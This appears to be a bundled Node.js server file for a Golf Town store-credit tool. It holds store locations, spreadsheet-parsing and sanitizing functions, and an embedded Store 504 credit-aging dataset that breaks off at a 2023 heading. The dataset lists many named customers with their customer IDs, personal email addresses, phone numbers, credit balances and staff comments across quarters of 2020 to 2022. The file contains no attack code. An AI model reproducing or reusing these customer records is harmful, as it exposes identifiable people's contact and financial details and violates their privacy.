var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));

// server.ts
var import_express = __toESM(require("express"), 1);
var import_path = __toESM(require("path"), 1);
var import_fs = __toESM(require("fs"), 1);
var import_child_process = require("child_process");
var import_compression = __toESM(require("compression"), 1);
var import_https = __toESM(require("https"), 1);
var import_genai = require("@google/genai");

// src/data/golfTownStores.ts
var GOLF_TOWN_STORES = [
  {
    id: "504",
    name: "Store 504 - South Calgary Golf Town",
    code: "504",
    address: "130 11500 35 St SE",
    city: "Calgary",
    province: "AB",
    postalCode: "T2Z 3W4",
    phone: "(403) 723-0100",
    googleMapsUrl: "https://www.google.com/maps/search/?api=1&query=Golf+Town+130+11500+35+St+SE+Calgary+AB+T2Z+3W4",
    lat: 50.9472,
    lng: -113.9845
  },
  {
    id: "501",
    name: "Store 501 - Calgary North Golf Town",
    code: "501",
    address: "1130 Country Hills Blvd NE #100",
    city: "Calgary",
    province: "AB",
    postalCode: "T3K 6E2",
    phone: "(403) 226-6200",
    googleMapsUrl: "https://www.google.com/maps/search/?api=1&query=Golf+Town+1130+Country+Hills+Blvd+NE+Calgary+AB",
    lat: 51.1558,
    lng: -114.0321
  },
  {
    id: "502",
    name: "Store 502 - West Edmonton Golf Town",
    code: "502",
    address: "10012 170 St NW",
    city: "Edmonton",
    province: "AB",
    postalCode: "T5P 4M9",
    phone: "(780) 489-4653",
    googleMapsUrl: "https://www.google.com/maps/search/?api=1&query=Golf+Town+10012+170+St+NW+Edmonton+AB",
    lat: 53.5398,
    lng: -113.615
  },
  {
    id: "505",
    name: "Store 505 - South Side Edmonton Golf Town",
    code: "505",
    address: "3383 Calgary Trail NW",
    city: "Edmonton",
    province: "AB",
    postalCode: "T6J 6RS",
    phone: "(780) 431-2999",
    googleMapsUrl: "https://www.google.com/maps/search/?api=1&query=Golf+Town+3383+Calgary+Trail+NW+Edmonton+AB",
    lat: 53.4682,
    lng: -113.4938
  },
  {
    id: "510",
    name: "Store 510 - Mississauga Golf Town",
    code: "510",
    address: "3105 Winston Churchill Blvd",
    city: "Mississauga",
    province: "ON",
    postalCode: "L5L 5S3",
    phone: "(905) 820-2228",
    googleMapsUrl: "https://www.google.com/maps/search/?api=1&query=Golf+Town+3105+Winston+Churchill+Blvd+Mississauga+ON",
    lat: 43.5328,
    lng: -79.6892
  },
  {
    id: "512",
    name: "Store 512 - Ottawa West Merivale Golf Town",
    code: "512",
    address: "1900 Merivale Rd",
    city: "Nepean",
    province: "ON",
    postalCode: "K2G 1E8",
    phone: "(613) 224-8696",
    googleMapsUrl: "https://www.google.com/maps/search/?api=1&query=Golf+Town+1900+Merivale+Rd+Nepean+Ottawa+ON",
    lat: 45.3421,
    lng: -75.7335
  },
  {
    id: "515",
    name: "Store 515 - Toronto Leaside Golf Town",
    code: "515",
    address: "80 Laird Dr",
    city: "Toronto",
    province: "ON",
    postalCode: "M4G 3V1",
    phone: "(416) 467-9300",
    googleMapsUrl: "https://www.google.com/maps/search/?api=1&query=Golf+Town+80+Laird+Dr+Toronto+ON",
    lat: 43.7082,
    lng: -79.3621
  },
  {
    id: "518",
    name: "Store 518 - Winnipeg South Kenaston Golf Town",
    code: "518",
    address: "1570 Kenaston Blvd",
    city: "Winnipeg",
    province: "MB",
    postalCode: "R3P 0Y7",
    phone: "(204) 488-8250",
    googleMapsUrl: "https://www.google.com/maps/search/?api=1&query=Golf+Town+1570+Kenaston+Blvd+Winnipeg+MB",
    lat: 49.839,
    lng: -97.2021
  },
  {
    id: "520",
    name: "Store 520 - Vancouver Marine Drive Golf Town",
    code: "520",
    address: "1200 SW Marine Dr",
    city: "Vancouver",
    province: "BC",
    postalCode: "V6P 5Z2",
    phone: "(604) 263-1200",
    googleMapsUrl: "https://www.google.com/maps/search/?api=1&query=Golf+Town+1200+SW+Marine+Dr+Vancouver+BC",
    lat: 49.2081,
    lng: -123.1328
  },
  {
    id: "525",
    name: "Store 525 - Richmond Golf Town",
    code: "525",
    address: "4000 No 3 Rd",
    city: "Richmond",
    province: "BC",
    postalCode: "V6X 2C2",
    phone: "(604) 279-9900",
    googleMapsUrl: "https://www.google.com/maps/search/?api=1&query=Golf+Town+4000+No+3+Rd+Richmond+BC",
    lat: 49.1824,
    lng: -123.1362
  }
];

// src/data/dataSanitizer.ts
function isHeaderRow(row) {
  if (!row || row.length === 0) return false;
  const rowStr = row.map((cell) => String(cell || "").toLowerCase()).join(" ");
  const headerKeywords = ["cust", "first", "last", "balance", "credit", "phone", "email", "aging", "sale", "created"];
  let matches = 0;
  for (const kw of headerKeywords) {
    if (rowStr.includes(kw)) matches++;
  }
  return matches >= 2;
}
function extractColIndexes(row) {
  const colIndexes = {};
  row.forEach((cell, cIdx) => {
    const str = String(cell || "").toLowerCase().trim();
    if (str.includes("cust_id") || str.includes("cust id") || str.includes("customer id")) {
      colIndexes["custId"] = cIdx;
    } else if (str.includes("first") || str.includes("f_name")) {
      colIndexes["firstName"] = cIdx;
    } else if (str.includes("last") || str.includes("l_name")) {
      colIndexes["lastName"] = cIdx;
    } else if (str.includes("company")) {
      colIndexes["company"] = cIdx;
    } else if (str.includes("email")) {
      colIndexes["email"] = cIdx;
    } else if (str.includes("phone") || str.includes("tel")) {
      colIndexes["phone"] = cIdx;
    } else if (str.includes("city") || str.includes("town")) {
      colIndexes["city"] = cIdx;
    } else if (str.includes("balance") || str.includes("credit") || str.includes("sum of store credit")) {
      colIndexes["balance"] = cIdx;
    } else if (str.includes("comment") || str.includes("notes")) {
      colIndexes["comments"] = cIdx;
    } else if (str.includes("keep or remove") || str.includes("keep")) {
      colIndexes["keepOrRemove"] = cIdx;
    } else if (str.includes("created")) {
      colIndexes["createdDate"] = cIdx;
    } else if (str.includes("sale")) {
      colIndexes["saleDate"] = cIdx;
    } else if (str.includes("aging")) {
      colIndexes["aging"] = cIdx;
    }
  });
  return colIndexes;
}
function sanitizeCustomerRecord(record) {
  let balance = record.sumOfStoreCreditBalance;
  let phone = record.phone || "";
  let custId = record.custId || "";
  if (balance > 5e4 || balance > 1e4 && Number.isInteger(balance)) {
    const balIntStr = String(Math.round(balance));
    if (balIntStr.length === 10) {
      if (!phone || phone === "(403) 723-0100" || phone === "(blank)" || !/\d/.test(phone)) {
        phone = `(${balIntStr.slice(0, 3)}) ${balIntStr.slice(3, 6)}-${balIntStr.slice(6)}`;
      }
      balance = 0;
    } else if (balIntStr.length >= 7 && balIntStr.length <= 9) {
      if (!custId || custId.startsWith("CUST-")) {
        custId = balIntStr;
      }
      balance = 0;
    } else {
      balance = 0;
    }
    if (record.comments) {
      const match = record.comments.match(/\$?\s*(\d{1,5}(?:\.\d{2})?)/);
      if (match && match[1]) {
        const recovered = parseFloat(match[1]);
        if (!isNaN(recovered) && recovered < 5e4) {
          balance = recovered;
        }
      }
    }
  }
  if (phone === "(blank)" || !phone) {
    phone = "(403) 723-0100";
  }
  return {
    ...record,
    sumOfStoreCreditBalance: balance,
    phone,
    custId
  };
}
function sanitizeCustomerRecords(records) {
  return records.map(sanitizeCustomerRecord);
}
function parseRowWithSmartAlignment(row, activeColIndexes, defaultCity = "Calgary", forceColIndexes = false) {
  if (!row || row.length === 0) return { isHeader: false };
  if (!forceColIndexes && isHeaderRow(row)) {
    const newColIndexes = extractColIndexes(row);
    return { isHeader: true, newColIndexes };
  }
  let rawCustId = activeColIndexes["custId"] !== void 0 ? String(row[activeColIndexes["custId"]] || "") : "";
  let firstName = activeColIndexes["firstName"] !== void 0 ? String(row[activeColIndexes["firstName"]] || "") : "";
  let lastName = activeColIndexes["lastName"] !== void 0 ? String(row[activeColIndexes["lastName"]] || "") : "";
  let company = activeColIndexes["company"] !== void 0 ? String(row[activeColIndexes["company"]] || "") : "";
  let email = activeColIndexes["email"] !== void 0 ? String(row[activeColIndexes["email"]] || "") : "";
  let phone = activeColIndexes["phone"] !== void 0 ? String(row[activeColIndexes["phone"]] || "") : "";
  let city = activeColIndexes["city"] !== void 0 ? String(row[activeColIndexes["city"]] || "") : defaultCity;
  let rawBalStr = activeColIndexes["balance"] !== void 0 ? String(row[activeColIndexes["balance"]] || "0") : "0";
  let comments = activeColIndexes["comments"] !== void 0 ? String(row[activeColIndexes["comments"]] || "") : "";
  let keepOrRemove = activeColIndexes["keepOrRemove"] !== void 0 ? String(row[activeColIndexes["keepOrRemove"]] || "") : "";
  let createdDate = activeColIndexes["createdDate"] !== void 0 ? String(row[activeColIndexes["createdDate"]] || "") : "";
  let saleDate = activeColIndexes["saleDate"] !== void 0 ? String(row[activeColIndexes["saleDate"]] || "") : "";
  let aging = activeColIndexes["aging"] !== void 0 ? String(row[activeColIndexes["aging"]] || "") : "";
  if (company === "(blank)") company = "";
  if (email === "(blank)") email = "";
  if (phone === "(blank)") phone = "";
  let cleanBal = rawBalStr.replace(/[$,]/g, "").trim();
  let balanceNum = parseFloat(cleanBal) || 0;
  const isBadBalance = balanceNum > 5e4 || /^\d{7,10}$/.test(cleanBal) && balanceNum > 1e4;
  if (isBadBalance) {
    if (/^\d{10}$/.test(cleanBal) && !phone) {
      phone = `(${cleanBal.slice(0, 3)}) ${cleanBal.slice(3, 6)}-${cleanBal.slice(6)}`;
    } else if (/^\d{7,9}$/.test(cleanBal) && !rawCustId) {
      rawCustId = cleanBal;
    }
    let rescuedBalance = 0;
    let foundRescue = false;
    for (let c = 0; c < row.length; c++) {
      const cellVal = String(row[c] || "").trim();
      if (!cellVal || cellVal === "(blank)" || cellVal === "-") continue;
      if (cellVal.includes("/") || cellVal.includes("-") && cellVal.length > 5) continue;
      if (cellVal.includes("@")) continue;
      if (/^(keep|remove|n\/a|processed|over 30|to be cleaned)/i.test(cellVal)) continue;
      const num = parseFloat(cellVal.replace(/[$,]/g, ""));
      if (!isNaN(num) && num < 5e4 && num >= -5e4) {
        const digits = cellVal.replace(/[$,.]/g, "");
        if (!/^\d{7,10}$/.test(digits)) {
          rescuedBalance = num;
          foundRescue = true;
          break;
        }
      }
    }
    balanceNum = foundRescue ? rescuedBalance : 0;
  }
  for (let c = 0; c < row.length; c++) {
    const val = String(row[c] || "").trim();
    if (!val || val === "(blank)") continue;
    if (!phone || phone === "(403) 723-0100") {
      const phoneDigits = val.replace(/\D/g, "");
      if (phoneDigits.length === 10) {
        phone = `(${phoneDigits.slice(0, 3)}) ${phoneDigits.slice(3, 6)}-${phoneDigits.slice(6)}`;
      }
    }
    if (!email && val.includes("@") && !val.includes(" ")) {
      email = val;
    }
    if (!rawCustId) {
      const idDigits = val.replace(/\D/g, "");
      if (idDigits.length >= 7 && idDigits.length <= 9 && !val.includes("/") && !val.includes("@")) {
        rawCustId = val;
      }
    }
  }
  if (!firstName && !lastName) {
    if (row[0] && typeof row[0] === "string" && !row[0].includes("Over") && !row[0].includes("Quarter")) {
      firstName = String(row[0]).trim();
    }
    if (row[1] && typeof row[1] === "string" && !row[1].includes("/") && !/\d/.test(row[1])) {
      lastName = String(row[1]).trim();
    }
  }
  return {
    isHeader: false,
    parsedFields: {
      rawCustId,
      firstName: firstName.trim(),
      lastName: lastName.trim(),
      company: company.trim(),
      email: email.trim(),
      phone: phone.trim(),
      city: city.trim() || defaultCity,
      balanceNum,
      comments: comments.trim(),
      keepOrRemove: keepOrRemove.trim(),
      createdDate: createdDate.trim(),
      saleDate: saleDate.trim(),
      aging: aging.trim()
    }
  };
}

// src/data/store504Data.ts
var STORE_504_RAW_TEXT = `(OLDER PERIODS HIDDEN)																									
Quarter 1																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)														
Over 30 Days	10/1/2020	10/01/2020	25469599	Rod	MORRISON	RMORRISON@CITY.STRATFORD.ON.CA	4038759458	10.49	KEEP																
Over 30 Days	10/1/2020	02/25/2021	4047340	Store	4	SOUTHCALGARY@GOLFTOWN.COM	4032019301	-10.49	REMOVE																
Over 30 Days	10/19/2020	12/02/2020	888032820	francis	Thomas	JT.RES@HOTMAIL.COM	4038606415	110.22	KEEP																
Over 30 Days	12/30/2020	03/01/2021	4035016	GREG	Hamilton	(blank)	4032711216	157.49	KEEP																
To be cleaned up	3/31/2021	03/31/2021	904012280	lori	Jeffries	(blank)	4036608522	0.01	REMOVE																
																									
Quarter 2																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)														
Over 30 Days	10/1/2020	10/01/2020	25469599	ROD	Morrison	RMORRISON@CITY.STRATFORD.ON.CA	4038759458	10.49	REMOVE	Attempted contacting Rod multiple times, has not responded or used credit															
Over 30 Days	10/19/2020	12/02/2020	888032820	Francis	Thomas	JT.RES@HOTMAIL.COM	4038606415	110.22	KEEP	Contacted customer, said he would come in															
Over 30 Days	4/5/2021	04/05/2021	4033479	Cliff	CAMPBELL	CFCAMPBELL@SHAW.CA	4038612399	1,150.76	REMOVE	SHOULD BE AT $0															
Over 30 Days	4/6/2021	04/06/2021	888803172	THORNE	Thompson	TTHOMPSON@WATEROUSPOWER.COM	4036011447	1,528.19	REMOVE	SHOULD BE AT $0															
Over 30 Days	5/4/2021	05/04/2021	904012184	Mijong	Park	(blank)	4033978236	37.49	KEEP	customer owed refund from special order issue															
Over 30 Days	5/12/2021	05/12/2021	888281151	Tom	Trathen	(blank)	4034735793	125.99	REMOVE	SHOULD BE AT $0															
Over 30 Days	5/20/2021	05/20/2021	504005323	Sam	armstrong	sjoarmst@gmail.com	4037034752	125.99	KEEP	PRODUCT HASN'T ARRIVED YET															
Over 30 Days	5/27/2021	05/27/2021	904012723	Travis	Wowniar	(blank)	4038297465	51.45	KEEP	SPECIAL ORDER WAS CANCELLED, WASN'T REFUNDED FULL AMOUNT															
																									
Quarter 3																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)														
Over 30 Days	10/19/2020	12/02/2020	888032820	Francis	Thomas	JT.RES@HOTMAIL.COM	4038606415	110.22	KEEP	CONTACTED CUSTOMER, MOVING TO GC FRIDAY NEXT WEEK IF FRANCIS DOES NOT COME IN															
Over 30 Days	5/4/2021	08/14/2021	904012184	Mijong	Park	(blank)	4033978236	37.49	KEEP	SPECIAL ORDER DISCOUNT DUE TO TIMELINE, REMIANING VANSON NOT REFUNDED - CONTACTED															
Over 30 Days	5/27/2021	05/27/2021	904012723	Travis	Wowniar	(blank)	4038297465	51.45	KEEP	TOO MUCH TAKEN AT TIME OF VANSON - CONTACTED WILL REFUND															
Over 30 Days	6/1/2021	07/21/2021	904010720	Joel	Lemire	joel.lemire55@gmail.com	4039904196	89.23	N/A	CASHIER ERROR RUNG S.O. UNDER VANSON - USED AT $0															
Over 30 Days	6/16/2021	08/04/2021	4045465	Paul	Billington	(blank)	4039938313	241.38	N/A	CASHIER ERROR RUNG S.O. UNDER VANSON - USED AT $0															
Over 30 Days	6/16/2021	08/21/2021	504000464	rick	Begg	rlbegg@rogers.com	5872271545	1,499.99	KEEP	ORDER HASN'T COME IN															
Over 30 Days	6/24/2021	06/24/2021	904015474	Ken	Smith	(blank)	4036520437	1,979.96	KEEP	ORDER HASN'T COME IN															
Over 30 Days	7/5/2021	07/05/2021	504018143	Keith	Bradley	(blank)	4033320111	1,679.92	KEEP	ORDER HASN'T COME IN															
Over 30 Days	7/9/2021	07/09/2021	904015912	Brayden	Erickson	(blank)	5872261585	1,102.43	KEEP	ORDER HASN'T COME IN															
Over 30 Days	7/18/2021	07/18/2021	904016196	chloe	nielsen	(blank)	5875762456	262.5	KEEP	ORDER HASN'T COME IN															
Over 30 Days	7/30/2021	09/10/2021	504007482	James	cousins	jamescousins@gmail.com	4038742268	1,379.95	KEEP	ORDER HASN'T COME IN															
Over 30 Days	8/8/2021	08/08/2021	504013351	alan	gillespie	gillespie@telefish.net	5874322234	1,511.91	KEEP	ORDER HASN'T COME IN															
Over 30 Days	8/11/2021	08/11/2021	888401462	LOC	DUONG	DUONG_LOC@HOTMAIL.COM	4039702037	749.99	KEEP	PARTIAL WAITING OR OTHER HALF OF ORDER															
Over 30 Days	8/11/2021	08/11/2021	504006263	Victor	Danyluk	danyluk@gmail.com	7809105777	141.75	KEEP	ORDER HASN'T COME IN															
Over 30 Days	8/16/2021	09/26/2021	4054488	Theo	Fleury	theo14@theofleury14.com	5875721400	734.33	KEEP	ORDER HASN'T COME IN															
Over 30 Days	8/24/2021	10/13/2021	904012968	MICHAEL	Pichnej	(blank)	4037012594	188.99	KEEP	ORDER HASN'T COME IN															
Over 30 Days	8/30/2021	08/30/2021	904017214	Adam	Boyes	(blank)	4038500137	2,099.92	KEEP	ORDER HASN'T COME IN															
Over 30 Days	9/8/2021	09/08/2021	904017354	Michelle	Dickinson	(blank)	4036167360	1,034.96	KEEP	ORDER HASN'T COME IN															
Over 30 Days	9/14/2021	09/28/2021	904016417	Yusuf	Ashraf	(blank)	7802455361	1,312.48	KEEP	PARTIAL WAITING ON OTHER HALF OF ORDER															
Over 30 Days	9/16/2021	09/16/2021	904015891	Kim	Sanford	(blank)	4032276737	389.99	KEEP	PARTIAL WAITING ON OTHER HALF OF ORDER															
Over 30 Days	9/16/2021	09/16/2021	7095325	Colby	JOHANNSON	(blank)	6047877481	1,543.47	KEEP	ORDER HASN'T COME IN															
To be cleaned up	7/14/2021	08/13/2021	4061949	darcy	Shand	(blank)	4038036331	0.01	REMOVE																
To be cleaned up	8/11/2021	08/11/2021	904015727	Brian	Ahearn	brianahearn@shaw.ca	4039699901	0.3	REMOVE																
To be cleaned up	9/13/2021	09/13/2021	936014225	Justin	Huberdeau	(blank)	3063806460	0.01	REMOVE																
																									
Quarter 4																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)														
Over 30 Days	10/19/2020	12/02/2020	888032820	francis	Thomas	JT.RES@HOTMAIL.COM	4038606415	110.22	keep	Left msg															
Over 30 Days	5/4/2021	08/14/2021	904012184	Mijong	Park	(blank)	4033978236	37.49	KEEP	CONTACTED - COMING IN TO USE															
Over 30 Days	5/27/2021	05/27/2021	904012723	Travis	Wowniar	(blank)	4038297465	51.45	KEEP	CONTACTED - COMING IN TO USE															
Over 30 Days	8/16/2021	12/21/2021	4054488	Theo	Fleury	theo14@theofleury14.com	5875721400	734.33	KEEP	ORDER HAS NOT ARRIVED															
Over 30 Days	9/8/2021	12/23/2021	904017354	Michelle	Dickinson	(blank)	4036167360	1,034.96	N/A	USED - RCT# 227497 - 1/19/22															
Over 30 Days	9/14/2021	09/28/2021	904016417	Yusuf	Ashraf	(blank)	7802455361	1,312.48	KEEP	ORDER HAS NOT ARRIVED 															
Over 30 Days	10/11/2021	10/16/2021	888124392	RON	Van Raalten	RVANRAALTEN@ALLSTATE.CA	4038156772	388.49	KEEP	ORDER HAS NOT ARRIVED 															
Over 30 Days	10/13/2021	12/17/2021	888204830	Zul	Allidina	ZULALLIDINA@SHAW.CA	4038618044	1,499.99	KEEP	ORDER HAS NOT ARRIVED 															
Over 30 Days	10/15/2021	10/16/2021	904017757	Debbie	dymianiw	(blank)	4038358895	1,867.48	KEEP	ORDER HAS NOT ARRIVED 															
Over 30 Days	10/21/2021	10/21/2021	904017786	Mike	Berger	(blank)	3066797034	1,469.93	KEEP	ORDER HAS NOT ARRIVED 															
Over 30 Days	10/23/2021	10/23/2021	4053078	Sherrill	Gibson	sherrillgibson@gmail.com	4038509925	367.49	KEEP	ORDER HAS NOT ARRIVED 															
Over 30 Days	10/30/2021	10/30/2021	37109460	Brent	GORDON	BGORDON@TACMOBILITY.COM	4038098369	1,679.99	KEEP	ORDER HAS NOT ARRIVED 															
Over 30 Days	11/9/2021	11/09/2021	904015912	Brayden	Erickson	(blank)	5872261585	314.98	KEEP	ORDER HAS NOT ARRIVED 															
Over 30 Days	11/10/2021	11/27/2021	937001162	kay	KIM	kaykim8555@gmail.com	5874340225	1,679.92	KEEP	ORDER HAS NOT ARRIVED															
Over 30 Days	11/23/2021	11/23/2021	4060990	Justin	Warthe	JRWARTHE_@HOTMAIL.COM	4036208746	230.99	KEEP	ORDER HAS NOT ARRIVED															
Over 30 Days	11/24/2021	11/24/2021	888610379	kelly	St.Jean	STJEANK@TELUS.NET	4039983081	2,149.14	KEEP	ORDER HAS NOT ARRIVED															
Over 30 Days	11/28/2021	12/11/2021	904018045	Bryan	Kenly	bryan@exqelectric.com	5872242127	1,102.43	KEEP	ORDER HAS NOT ARRIVED															
Over 30 Days	12/7/2021	12/07/2021	537010923	Camille	LeRouge	camille.lerouge@gmail.com	4033837893	230.99	KEEP	ORDER HAS NOT ARRIVED															
Over 30 Days	12/8/2021	12/08/2021	910007399	Lee	Campbell	(blank)	7788052166	9,573.57	KEEP	ORDER HAS NOT ARRIVED															
Over 30 Days	12/8/2021	12/08/2021	956003127	Carly	HOWARD	carlyhoward7@hotmail.com	7054271903	2,846.92	KEEP	ORDER HAS NOT ARRIVED															
Over 30 Days	12/17/2021	12/17/2021	904010654	JOE	Gregory	(blank)	4037633139	1,589.99	KEEP	ORDER HAS NOT ARRIVED															
Over 30 Days	12/17/2021	12/27/2021	4046038	Brad	LOCK	LOCKFAMILY@SHAW.CA	4038603730	1,966.05	KEEP	ORDER HAS NOT ARRIVED															
Over 30 Days	12/18/2021	12/18/2021	888178895	dean	Custance	CUSSY34@HOTMAIL.COM	4032326483	74.54	KEEP	ORDER HAS NOT ARRIVED															
To be cleaned up	1/10/2022	01/10/2022	527008998	ADAM	Pauliuk	virtualadam@gmail.com	4036162326	0.02	REMOVE																
																									
Quarter 1 (2022)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)														
Over 30 Days	10/19/2020	12/2/2020	888032820	Francis	Thomas	JT.RES@HOTMAIL.COM	4038606415	110.22	keep																
Over 30 Days	5/4/2021	8/14/2021	904012184	Mijong	Park	(blank)	4033978236	37.49	keep																
Over 30 Days	5/27/2021	5/27/2021	904012723	Trevor	Wowniar	(blank)	4038297465	51.45	keep																
Over 30 Days	11/24/2021	2/4/2022	888610379	KELLY	St.jean	STJEANK@TELUS.NET	4039983081	2,149.14	keep																
Over 30 Days	1/31/2022	3/21/2022	904016575	James	Kim	(blank)	4034730625	1,749.76	keep																
Over 30 Days	2/13/2022	2/13/2022	4050054	KEVIN	Chim	KEVIN.CHIM@GMAIL.COM	4038285555	581.69	keep																
Over 30 Days	3/3/2022	4/10/2022	4047966	Stephen	Bekkering	SBEKKERING@HOTMAIL.COM	5877770744	1,225.77	keep																
Over 30 Days	3/11/2022	4/14/2022	904011609	Jacques	Caouette	(blank)	4039181548	503.98	keep																
Over 30 Days	3/12/2022	3/12/2022	927002058	bill	Osman	rimasholdings@gmail.com	4037085670	255.14	keep																
Over 30 Days	3/15/2022	3/15/2022	888213269	Keith	Kyun	MERITPROPERTIES@HOTMAIL.COM	4037105243	692.97	keep																
To be cleaned up	3/20/2022	3/20/2022	904018569	Troy 	YOUNG	dirtking4774@hotmail.com	4035011500	0.02	To be removed																
																									
Quarter 2 (2022)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)														
Over 30 Days	10/19/2020	12/2/2020	888032820	Francis	Thomas	JT.RES@HOTMAIL.COM	4038606415	110.22	keep																
Over 30 Days	5/4/2021	8/14/2021	904012184	Mijong	Park	(blank)	4033978236	37.49	KEEP 																
Over 30 Days	5/27/2021	5/27/2021	904012723	Trevor	Wowniar	(blank)	4038297465	51.45	KEEP 																
Over 30 Days	2/13/2022	6/8/2022	4050054	KEVIN	Chim	KEVIN.CHIM@GMAIL.COM	4038285555	581.69	KEEP 	Long delay on special order for bag															
Over 30 Days	3/11/2022	6/25/2022	904011609	jacques	Caouette	(blank)	4039181548	503.98	KEEP 																
Over 30 Days	3/12/2022	6/24/2022	927002058	Bill	Osman	rimasholdings@gmail.com	4037085670	255.14	KEEP 																
Over 30 Days	5/5/2022	5/5/2022	904020170	Francois	Cusson	(blank)	4032813097	2,377.12	KEEP 																
Over 30 Days	5/20/2022	5/20/2022	888138441	Jonathan	Habok	(blank)	4039234336	2,123.94	KEEP 																
Over 30 Days	5/23/2022	5/23/2022	904010175	Graham	GILBERT	(blank)	5062611268	2,039.94	KEEP 																
Over 30 Days	5/27/2022	5/27/2022	4062672	Lance	Nelson	LANCE@EMPIREPPE.CA	4036183172	312.36	KEEP 																
Over 30 Days	5/30/2022	6/14/2022	904019492	Craig	halford	(blank)	4033902057	262.49	KEEP																
Over 30 Days	6/8/2022	6/8/2022	904020931	Randy	kaminsky	(blank)	4032001443	155.38	KEEP 																
Over 30 Days	6/15/2022	6/15/2022	904020553	Tony	Slade	(blank)	2368187593	9.45	REMOVE																
Over 30 Days	6/16/2022	6/16/2022	904021164	Rene	Angermeier	(blank)	4033590951	944.99	KEEP 																
Over 30 Days	6/17/2022	6/17/2022	4047091	Brent	Clarke	BVCLARKE@SHAW.CA	4035613271	209.99	KEEP																
Over 30 Days	6/17/2022	6/21/2022	904002448	duane	arndt	(blank)	4039935095	1,397.21	KEEP 																
To be cleaned up	4/26/2022	5/4/2022	904019527	Jordan	Brennan	(blank)	2504253806	0.01	REMOVE																
To be cleaned up	5/10/2022	5/10/2022	888213269	Keith	Kyun	MERITPROPERTIES@HOTMAIL.COM	4037105243	0.02	REMOVE																
To be cleaned up	5/11/2022	5/11/2022	904019401	STEVE	Janz	(blank)	4038502761	0.01	REMOVE																
To be cleaned up	5/13/2022	5/13/2022	904020200	louise	proulx	(blank)	5878936832	0.01	REMOVE																
																									
Quarter 3 (2022)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	10/19/2020	12/2/2020	888032820	Francis	Thomas	(blank)	JT.RES@HOTMAIL.COM	4038606415	110.22	KEEP	Customer lives out of town														
Over 30 Days	5/4/2021	8/14/2021	904012184	Mijong	Park	(blank)	(blank)	4033978236	37.49	KEEP															
Over 30 Days	5/27/2021	5/27/2021	904012723	Trevor	Wowniar	(blank)	(blank)	4038297465	51.45	KEEP															
Over 30 Days	5/27/2022	5/27/2022	4062672	Lance	Nelson	(blank)	LANCE@EMPIREPPE.CA	4036183172	312.36	KEEP	Long delay on special order														
Over 30 Days	8/4/2022	8/4/2022	904022383	Giovanni	Fileccia	(blank)	(blank)	4033692810	734.99	KEEP															
Over 30 Days	8/17/2022	8/18/2022	904017180	Tammi	Andrew	(blank)	(blank)	4037010529	105	KEEP															
Over 30 Days	9/2/2022	9/2/2022	4066694	Chris	Burke	(blank)	CHRIS_BURKE7@HOTMAIL.COM	4039198918	1,858.45	KEEP															
To be cleaned up	9/19/2022	9/19/2022	904023466	Loralie	mahan	(blank)	(blank)	4036152565	0.01	REMOVE															
To be cleaned up	10/3/2022	10/3/2022	904012112	Wynn	Carr	(blank)	(blank)	4035899019	0.04	REMOVE															
																									
																									
Quarter 4 (2022)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	10/19/2020	12/2/2020	888032820	Francis	Thomas	(blank)	JT.RES@HOTMAIL.COM	4038606415	110.22	KEEP 															
Over 30 Days	5/4/2021	8/14/2021	904012184	Mijong	Park	(blank)	(blank)	4033978236	37.49	REMOVE															
Over 30 Days	8/4/2022	8/4/2022	904022383	Giovanni	Fileccia	(blank)	(blank)	4033692810	734.99	KEEP 															
Over 30 Days	8/17/2022	8/18/2022	904017180	Tammi	Andrew	(blank)	(blank)	4037010529	105	KEEP 															
Over 30 Days	9/29/2022	10/31/2022	888138441	Jonathan	Habok	(blank)	(blank)	4039234336	84	KEEP 															
Over 30 Days	12/13/2022	12/13/2022	904022729	Kevin	Stengler	(blank)	(blank)	4036340874	254.99	KEEP 															
																									
																									
Quarter 1 (2023)																									
